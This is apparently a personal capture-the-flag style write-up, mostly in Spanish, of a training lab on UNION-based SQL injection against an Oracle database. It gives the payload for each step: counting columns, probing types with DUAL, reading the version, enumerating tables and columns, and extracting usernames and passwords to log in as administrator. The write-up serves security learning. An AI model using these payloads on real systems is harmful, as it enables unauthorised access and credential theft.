---
title: "Lab: SQL injection attack, listing the database contents on Oracle"
date: 2026-01-13
category: "SQL Injection"
order: 11
tags: ["web-security-academy", "sql-injection", "lab", "oracle"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-listing-contents-oracle.html
---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

---

## Paso 1 — Saber el número de columnas

```sql
' ORDER BY 1--
' ORDER BY 3-- → Internal error → 3-1 = 2 columnas
```

## Paso 2 — Saber qué tipo de datos son

```sql
' UNION SELECT 'a', NULL FROM DUAL-- → No error: acepta str
' UNION SELECT NULL, 'a' FROM DUAL-- → No error: acepta str
```

## Paso 3 — Confirmar que es Oracle

Al principio los queries genéricos no funcionaban como en otros motores. Para confirmar que se trataba de Oracle se probó el operador de concatenación `||`, propio de ese motor:

```sql
' || 'a → No retornaba nada, lo que confirma que es Oracle.
```

## Paso 4 — Retornar la versión de la base de datos

```sql
' UNION SELECT 'a', banner FROM v$version--
```

## Paso 5 — Retornar las tablas disponibles

```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

Esto reveló el nombre real de la tabla de usuarios (ej. `USERS_BIROMR`).

## Paso 6 — Retornar las columnas de esa tabla

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_BIROMR'--
```

## Paso 7 — Extraer usuario y contraseña ✅

```sql
' UNION SELECT USERNAME_SSKKKA, PASSWORD_BDIHVH FROM USERS_BIROMR--
--                ↑columna1        ↑columna2        ↑tabla objetivo
```

Con las credenciales obtenidas se inicia sesión como `administrator`. Lab resuelto.

---

## Nota sobre Oracle y `DUAL`

- **Valores fijos** (literales, no provenientes de una tabla real, como en el paso 2 y 3): se necesita usar `FROM DUAL`.
- **Valores retornables** desde una tabla real (`v$version`, `all_tables`, `all_tab_columns`, la tabla de usuarios): no se necesita `DUAL`, porque ya hay una tabla de origen válida.
